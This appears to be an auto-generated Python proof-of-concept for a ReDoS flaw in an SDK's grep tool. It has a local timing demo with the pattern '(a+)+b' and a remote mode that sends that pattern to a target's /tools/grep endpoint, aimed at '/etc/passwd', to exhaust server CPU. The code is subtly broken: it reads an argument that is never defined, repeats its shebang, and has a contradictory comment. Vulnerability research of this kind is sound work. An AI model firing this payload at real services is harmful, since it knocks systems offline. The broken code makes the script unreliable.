#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: redos-018
# Sink: beta_grep_tool
# Auto-generated — run with: python3 redos_cpu_consumption_leading_denial_beta_grep_tool.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: ReDoS (Regular Expression Denial of Service) in anthropic SDK
    - beta_grep_tool falls back to Python's re.compile() when ripgrep is absent.
    - No timeout, input length limit, or sanitization.
    - A malicious pattern like (a+)+b combined with a long input string causes
      catastrophic backtracking, leading to CPU exhaustion and denial of service.
    - This script demonstrates the vulnerability locally by simulating the same
      code path.  For remote testing (if an environment worker or MCP server is
      available), use the --target option (see comments).
    - Safe by default: uses a benign pattern and short input.
"""
import argparse
import re
import sys
import time
import shutil

# ----------------------------------------------------------------------
# Configurable defaults (can be overridden via command line)
# ----------------------------------------------------------------------
DEFAULT_PATTERN = "(a+)+b"          # classic ReDoS pattern
DEFAULT_INPUT_LENGTH = 100          # safe length for demonstration
DANGEROUS_INPUT_LENGTH = 1000       # long enough to show exponential slowdown
BENIGN_PATTERN = "test"             # for comparison
# ----------------------------------------------------------------------

def simulate_grep(pattern: str, input_text: str) -> float:
    """
    Simulate the vulnerable code path in beta_grep_tool.
    Compiles the regex and runs a match against the entire input.
    Returns the elapsed time in seconds.
    """
    start = time.perf_counter()
    try:
        rx = re.compile(pattern)
        # Use search() as the original code would match anywhere in file content
        rx.search(input_text)
    except re.error:
        # Invalid regex – not exploitable
        pass
    end = time.perf_counter()
    return end - start

def run_local_demo(args):
    """Demonstrate the ReDoS locally using Python's re module."""
    print("=" * 60)
    print("Local ReDoS demonstration (simulating beta_grep_tool fallback)")
    print("=" * 60)

    # Check if ripgrep is available – if so, the real SDK would use it and be safe
    rg_available = shutil.which("rg") is not None
    print(f"ripgrep available: {rg_available}")
    if rg_available:
        print("(In a real environment with ripgrep, the vulnerability is NOT triggered.)")
    else:
        print("(Without ripgrep, Python's re engine is used – ReDoS possible.)")
    print()

    # Define test inputs
    benign_text = f"{'a' * args.input_length}b"   # matches instantly
    evil_text = f"{'a' * args.input_length}x"     # no match → backtracking

    # Time a benign pattern first
    print(f"Testing benign pattern '{BENIGN_PATTERN}' on {args.input_length}-char input...")
    t1 = simulate_grep(BENIGN_PATTERN, benign_text)
    print(f"  Time: {t1:.6f} s")

    # Time the ReDoS pattern on input that DOES match (fast, no backtrack)
    print(f"Testing ReDoS pattern '{args.pattern}' on matching input...")
    t2 = simulate_grep(args.pattern, benign_text)
    print(f"  Time: {t2:.6f} s")

    # Time the ReDoS pattern on input that does NOT match (triggers backtracking)
    print(f"Testing ReDoS pattern '{args.pattern}' on NON-matching input...")
    t3 = simulate_grep(args.pattern, evil_text)
    print(f"  Time: {t3:.6f} s")

    # Ratio to show exponential slowdown
    if t2 > 0 and t3 > t2:
        ratio = t3 / t2
        print(f"\n[!] Exponential slowdown factor: {ratio:.2f}x")
    print()

    if t3 > 1.0:
        print("WARNING: Pattern caused significant delay (>1 second).")
        print("With longer input (e.g., 10k+ characters) it can freeze the process.")
    else:
        print("(Use --length 1000 or higher to see a more dramatic effect.)")

def run_remote_demo(args):
    """
    If a target URL is provided, attempt to exploit a remote environment worker
    or MCP server that exposes the grep tool.  Adjust the endpoint and method
    according to your actual service.
    """
    import requests

    print(f"Remote target: {args.target}")
    print("This part is a template – you must adapt it to your specific service.")
    print("Example: POST /tools/grep with JSON body {'pattern': evil_regex, 'path': '...'}")
    print()

    # Example payload – adjust to match your API
    payload = {
        "pattern": args.pattern,
        "path": "/etc/passwd"  # or any file the AI can write to
    }

    try:
        resp = requests.post(
            f"{args.target.rstrip('/')}/tools/grep",
            json=payload,
            timeout=10
        )
        print(f"Status: {resp.status_code}")
        if resp.status_code == 200:
            print("Tool call succeeded. Check server CPU usage.")
        else:
            print(f"Response: {resp.text[:200]}")
    except requests.exceptions.Timeout:
        print("Request timed out – likely triggered ReDoS on the server.")
    except requests.exceptions.ConnectionError as e:
        print(f"Connection error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="ReDoS PoC for anthropic SDK's beta_grep_tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Without --target, runs a local simulation using Python's re module.\n"
            "With --target, attempts to exploit a remote service (requires adaptation).\n"
            "Use --length 5000 to demonstrate severe slowdown (warning: may freeze)."
        )
    )
    parser.add_argument(
        "--target",
        help="URL of the remote service (e.g., http://localhost:8080). If not set, run local demo."
    )
    parser.add_argument(
        "--pattern",
        default=DEFAULT_PATTERN,
        help=f"Regex pattern to test (default: {DEFAULT_PATTERN})"
    )
    parser.add_argument(
        "--length",
        type=int,
        default=DEFAULT_INPUT_LENGTH,
        help=f"Length of 'a' repetitions in the input string (default: {DEFAULT_INPUT_LENGTH})"
    )
    args = parser.parse_args()

    if args.target:
        run_remote_demo(args)
    else:
        run_local_demo(args)

if __name__ == "__main__":
    main()
